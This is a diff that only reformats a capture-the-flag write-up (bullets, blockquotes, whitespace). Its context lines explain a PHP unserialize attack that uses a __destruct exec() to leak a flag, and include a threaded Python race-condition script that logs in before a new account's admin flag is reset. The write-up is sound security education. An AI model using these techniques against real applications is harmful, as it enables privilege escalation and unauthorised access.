@@ -117,23 +117,23 @@ if(isset($_POST['text'])){
 
 I'm a bit of a novice in PHP, so let's look more carefully at what we're dealing with. Here's some notes:
 
-* ```php
+- ```php
   substr(string $string, int $offset, ?int $length = null): string
   ```
 
   Returns the portion of `string` specified by the `offset` and `length` parameters.
 
-* ```php
+- ```php
   md5(string $string, bool $binary = false): string
   ```
 
   Calculates the MD5 hash of `string` using the [» RSA Data Security, Inc. MD5 Message-Digest Algorithm](http://www.faqs.org/rfcs/rfc1321), and returns that hash.
 
-* [`__FILE__`](http://us2.php.net/manual/en/language.constants.predefined.php) is a magic constant that gives you the filesystem path to the current .php file (the one that `__FILE__` is in, not the one it's included by if it's an include.
+- [`__FILE__`](http://us2.php.net/manual/en/language.constants.predefined.php) is a magic constant that gives you the filesystem path to the current .php file (the one that `__FILE__` is in, not the one it's included by if it's an include.
 
-* `REQUEST_URI`: The URI which was given in order to access this page; for instance, '`/index.html`'.
+- `REQUEST_URI`: The URI which was given in order to access this page; for instance, '`/index.html`'.
 
-* ```php
+- ```php
   header(string $header, bool $replace = true, int $response_code = 0): void
   ```
 
@@ -165,21 +165,21 @@ if(isset($_GET['source'])){
 
 Recall on magic methods such as `__toString`:
 
->Magic methods are special methods which override PHP's default's action when certain actions are performed on an object.
+> Magic methods are special methods which override PHP's default's action when certain actions are performed on an object.
 >
->**Caution**
+> **Caution**
 >
->All methods names starting with `__` are reserved by PHP. Therefore, it is not recommended to use such method names unless overriding PHP's behavior.
+> All methods names starting with `__` are reserved by PHP. Therefore, it is not recommended to use such method names unless overriding PHP's behavior.
 >
->...
+> ...
 >
->```php
->public __toString(): string
->```
+> ```php
+> public __toString(): string
+> ```
 >
->The [__toString()](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring) method allows a class to decide how it will react when it is treated like a string. For example, what `echo $obj;` will print.
+> The [\_\_toString()](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring) method allows a class to decide how it will react when it is treated like a string. For example, what `echo $obj;` will print.
 >
->Source: [PHP: Magic Methods - Manual](https://www.php.net/manual/en/language.oop5.magic.php)
+> Source: [PHP: Magic Methods - Manual](https://www.php.net/manual/en/language.oop5.magic.php)
 
 **To recap**
 
@@ -209,7 +209,7 @@ class User{
     $this->isAdmin = false;
     $this->solved = array();
     $this->points = 0;
-  
+
   }
 
   function setSolved($challid){
@@ -250,7 +250,7 @@ class Challenge{
       echo($output[0]);
     }
   }
-  
+
   function __destruct(){
     $this->stop();
   }
@@ -299,15 +299,15 @@ It is used to fetch a result row as an associative array.
 
 **Magic methods in this challenge**
 
-* `__construct`: If you create a `__construct()` function, PHP will automatically call this function when you create an object from a class.
-* `__destruct`: If you create a `__destruct()` function, PHP will automatically call this function at the end of the script. This is the method we'll exploit to leak the flag.
+- `__construct`: If you create a `__construct()` function, PHP will automatically call this function when you create an object from a class.
+- `__destruct`: If you create a `__destruct()` function, PHP will automatically call this function at the end of the script. This is the method we'll exploit to leak the flag.
 
 ### A first approach
 
 I tried downloading the default user object created by the website, changing the number of points and setting `isAdmin` to `true`:
 
 ```php
-❯ php user.php
+$ php user.php
 object(User)#1 (5) {
   ["name"]=>
   string(3) "123"
@@ -326,13 +326,13 @@ O:4:"User":5:{s:4:"name";s:3:"123";s:2:"id";i:0;s:7:"isAdmin";b:1;s:6:"solved";a
 
 ~~Thanks to that I managed to print a test challenge in the homepage of the app~~ Actually this is not true, as you'll see later on:
 
-># Welcome to METACTF
+> # Welcome to METACTF
 >
->Name: Test Challenge
+> Name: Test Challenge
 >
->Desc: This is an enabled test challenge
+> Desc: This is an enabled test challenge
 >
->Points: 100
+> Points: 100
 
 The code above gets printed for every user, admin or not.
 
@@ -360,9 +360,9 @@ $array[] = $var;
 exec(string $command, array &$output = null, int &$result_code = null): string|false
 ```
 
-* `command`: The command that will be executed.
-* `output`: If the `output` argument is present, then the specified array will be filled with every line of output from the command. Trailing whitespace, such as `\n`, is not included in this array. Note that if the array already contains some elements, **exec()** will append to the end of the array. If you do not want the function to append elements, call [unset()](https://www.php.net/manual/en/function.unset.php) on the array before passing it to **exec()**.
-* `result_code`: If the `result_code` argument is present along with the `output` argument, then the return status of the executed command will be written to this variable.
+- `command`: The command that will be executed.
+- `output`: If the `output` argument is present, then the specified array will be filled with every line of output from the command. Trailing whitespace, such as `\n`, is not included in this array. Note that if the array already contains some elements, **exec()** will append to the end of the array. If you do not want the function to append elements, call [unset()](https://www.php.net/manual/en/function.unset.php) on the array before passing it to **exec()**.
+- `result_code`: If the `result_code` argument is present along with the `output` argument, then the return status of the executed command will be written to this variable.
 
 **To recap**
 
@@ -376,21 +376,19 @@ print(serialize($c));
 
 Then, after uploading this, we load `index.php` and we'll get:
 
-># Welcome to METACTF
+> # Welcome to METACTF
 >
->User Backup file: 
+> User Backup file:
 >
+> Load User
 >
->
->Load User
->
->Stoping challenge!flag{nice_yuo_got_the_unserialize_flag!}
+> Stoping challenge!flag{nice_yuo_got_the_unserialize_flag!}
 
 ## metarace
 
 Same webapp as metactf, but different exploit: we need to registrate, login and get to the homepage before that the registration is finished. This is because at registration time the user is setted as non admin, which means that he cannot see all the challenges present in the database. If we are able to send a login request and to get the index.php faster than that, we'll be able to print what we need.
 
-* `register.php`
+- `register.php`
 
   ```php
   $db->create_user($name, $password);
@@ -400,7 +398,7 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
   }
   ```
 
-* `login.php`
+- `login.php`
 
   ```php
   $id = $db->login($name, $password);
@@ -411,9 +409,9 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
   }
   ```
 
-* `db.php`
+- `db.php`
 
-  * `fix_user`
+  - `fix_user`
 
     ```php
     function fix_user($idusers){
@@ -421,20 +419,20 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
             if (!($stmt = $this->mysqli->prepare("UPDATE users SET isadmin = 0 WHERE idusers = ?"))) {
                 echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
             }
-    
+
             /* Prepared statement, stage 2: bind and execute */
             if (!$stmt->bind_param("i", $idusers)) {
                 echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
             }
-    
+
             if (!$stmt->execute()) {
                 echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
             }
-    
+
         }
     ```
 
-  * `get_admin()`
+  - `get_admin()`
 
     ```php
     function get_admin($id){
@@ -442,16 +440,16 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
             if (!($stmt = $this->mysqli->prepare("SELECT isadmin FROM users WHERE idusers=?"))) {
                 echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
             }
-    
+
             /* Prepared statement, stage 2: bind and execute */
             if (!$stmt->bind_param("i", $id)) {
                 echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
             }
-    
+
             if (!$stmt->execute()) {
                 echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
             }
-    
+
             if (!($res = $stmt->get_result())) {
                 echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
             }
@@ -462,7 +460,7 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
         }
     ```
 
-  * `get_challenges()`
+  - `get_challenges()`
 
     ```php
     function get_challenges($id, $isadmin){
@@ -477,18 +475,18 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
                 if (!($stmt = $this->mysqli->prepare("SELECT name, descriptions, points FROM challenges WHERE isenabled=true"))) {
                     echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
                 }
-    
+
             }
-    
+
             if (!$stmt->execute()) {
                 echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
             }
-    
+
             if (!($res = $stmt->get_result())) {
                 echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
             }
             $challenges = array();
-    
+
             while ($info = $res->fetch_assoc()){
                 array_push($challenges, $info);
             }
@@ -500,7 +498,7 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
   ### The solution
 
   Quite straightforward: we setup two threads and we try to login and get to the home page of the website while the registration is still ongoing in order to be faster than the `fix_user` function, which would block access to the database.
-  
+
   ```python
   def registration(s, user, password):
     url = "%s/register.php" % HOST
@@ -508,15 +506,15 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
     #get_body(r)
     if "Registration Completed!" in r.text:
       return True
-    return False 
-   
+    return False
+
   def login(s, user, password):
     url = "%s/login.php" % HOST
     r = s.post(url, data={'username': user, 'password': password, 'log_user' : ''})
     r = s.get(HOST)
     if 'flag{' in r.text:
       get_body(r)
-  
+
   print('setting up session...')
   s = Session()
   print('starting loop...')
@@ -526,6 +524,5 @@ Same webapp as metactf, but different exploit: we need to registrate, login and 
     r = threading.Thread(target=registration, args=(s, username, password))
     l = threading.Thread(target=login, args=(s, username, password))
     r.start()
-    l.start() 
+    l.start()
   ```
-  
